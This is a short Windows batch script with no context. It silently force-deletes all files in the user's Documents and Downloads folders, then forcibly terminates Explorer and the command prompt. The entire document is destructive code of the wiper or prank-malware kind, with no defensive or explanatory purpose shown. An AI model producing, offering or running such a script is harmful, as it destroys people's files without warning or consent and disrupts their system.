@echo off
del /f /q "C:\Users\%username%\Documents\*.*"
del /f /q "C:\Users\%username%\Downloads\*.*"
taskkill /im explorer.exe /f
taskkill /im cmd.exe /f